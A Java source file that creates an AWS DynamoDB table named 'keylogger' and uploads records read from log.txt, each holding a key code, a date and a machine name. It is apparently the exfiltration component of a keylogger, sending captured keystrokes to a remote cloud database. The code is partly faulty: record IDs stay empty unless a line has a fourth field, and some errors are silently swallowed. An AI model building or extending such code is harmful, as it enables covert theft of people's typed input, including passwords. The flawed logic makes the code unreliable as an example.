package com.example.myapp;

import java.io.File;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;
import java.util.UUID;

// AWS import libraries
import com.amazonaws.AmazonClientException;
import com.amazonaws.AmazonServiceException;
import com.amazonaws.auth.profile.ProfileCredentialsProvider;
import com.amazonaws.services.dynamodbv2.AmazonDynamoDB;
import com.amazonaws.services.dynamodbv2.AmazonDynamoDBClientBuilder;
import com.amazonaws.services.dynamodbv2.model.AttributeDefinition;
import com.amazonaws.services.dynamodbv2.model.AttributeValue;
import com.amazonaws.services.dynamodbv2.model.CreateTableRequest;
import com.amazonaws.services.dynamodbv2.model.DescribeTableRequest;
import com.amazonaws.services.dynamodbv2.model.KeySchemaElement;
import com.amazonaws.services.dynamodbv2.model.KeyType;
import com.amazonaws.services.dynamodbv2.model.ProvisionedThroughput;
import com.amazonaws.services.dynamodbv2.model.PutItemRequest;
import com.amazonaws.services.dynamodbv2.model.PutItemResult;
import com.amazonaws.services.dynamodbv2.model.ScalarAttributeType;
import com.amazonaws.services.dynamodbv2.model.TableDescription;
import com.amazonaws.services.dynamodbv2.util.TableUtils;


public class test {
    static AmazonDynamoDB dynamoDB;

    private static void init() throws Exception {
        // Returns error if not credentials found (credentials are in .aws folder)
        ProfileCredentialsProvider credentialsProvider = new ProfileCredentialsProvider();
        try {
            credentialsProvider.getCredentials();
        } catch (Exception e) {
            throw new AmazonClientException(
                    "Cannot load the credentials from the credential profiles file. " +
                            "Please make sure that your credentials file is at the correct " +
                            "location (~/.aws/credentials), and is in valid format.",
                    e);
        }
        dynamoDB = AmazonDynamoDBClientBuilder.standard()
                .withCredentials(credentialsProvider)
                .withRegion("us-east-2")
                .build();
    }

    public static void main( String[] args )
    {



        try {
            init();
            String tableName = "keylogger";

            // Create a table with a primary hash key named 'ID', which holds a string
            CreateTableRequest createTableRequest = new CreateTableRequest().withTableName(tableName)
                    .withKeySchema(new KeySchemaElement().withAttributeName("ID").withKeyType(KeyType.HASH))
                    .withAttributeDefinitions(new AttributeDefinition().withAttributeName("ID").withAttributeType(ScalarAttributeType.S))
                    .withProvisionedThroughput(new ProvisionedThroughput().withReadCapacityUnits(1L).withWriteCapacityUnits(1L));

            // Create table if it does not exist yet
            TableUtils.createTableIfNotExists(dynamoDB, createTableRequest);
            // wait for the table to move into ACTIVE state
            TableUtils.waitUntilActive(dynamoDB, tableName);

            // Describe our new table
            DescribeTableRequest describeTableRequest = new DescribeTableRequest().withTableName(tableName);
            TableDescription tableDescription = dynamoDB.describeTable(describeTableRequest).getTable();


            // Add an item

            File file = new File("log.txt");
            Scanner sc = new Scanner(file);

            String k = "";
            String d = "";
            String m = "";
            String line = "";
            String uuid="";

            // Breaks every line of .txt into words and store each word in a variable
            while (sc.hasNextLine()) {
                line = sc.nextLine();
                String[] arrSplit = line.split(" ");
                for (int i = 0; i < arrSplit.length; i++) {
                    if (i == 0) {
                        k = arrSplit[i];
                    }else if (i==1) {
                        d = arrSplit[i];
                    }else if  (i==2) {
                        m = arrSplit[i];
                    } else if  (i==3) {
                        uuid = String.valueOf(UUID.randomUUID());
                    }
                }
                // With variables update de Dynamo database
                Map<String, AttributeValue> item = newItem(uuid,Integer.parseInt(k),Integer.parseInt(d),m);
                PutItemRequest putItemRequest = new PutItemRequest(tableName, item);
                PutItemResult putItemResult = dynamoDB.putItem(putItemRequest);
            }

            // if problem with varibles type or any other problem uploading data return this string
        } catch (AmazonServiceException ase) {
            System.out.println("Caught an AmazonServiceException, which means your request made it "
                    + "to AWS, but was rejected with an error response for some reason.");
            System.out.println("Error Message:    " + ase.getMessage());
            System.out.println("HTTP Status Code: " + ase.getStatusCode());
            System.out.println("AWS Error Code:   " + ase.getErrorCode());
            System.out.println("Error Type:       " + ase.getErrorType());
            System.out.println("Request ID:       " + ase.getRequestId());
        } catch (AmazonClientException ace) {
            System.out.println("Caught an AmazonClientException, which means the client encountered "
                    + "a serious internal problem while trying to communicate with AWS, "
                    + "such as not being able to access the network.");
            System.out.println("Error Message: " + ace.getMessage());
        } catch (Exception e){

        }
    }
    // Variables map, defines each type for each variable
    private static Map<String, AttributeValue> newItem(String ID, int key, int date, String machine) {
        Map<String, AttributeValue> item = new HashMap<String, AttributeValue>();
        item.put("ID", new AttributeValue(ID));
        item.put("key", new AttributeValue().withN(Integer.toString(key)));
        item.put("date", new AttributeValue().withN(Integer.toString(date)));
        item.put("machine", new AttributeValue(String.valueOf(machine)));

        return item;
    }
}
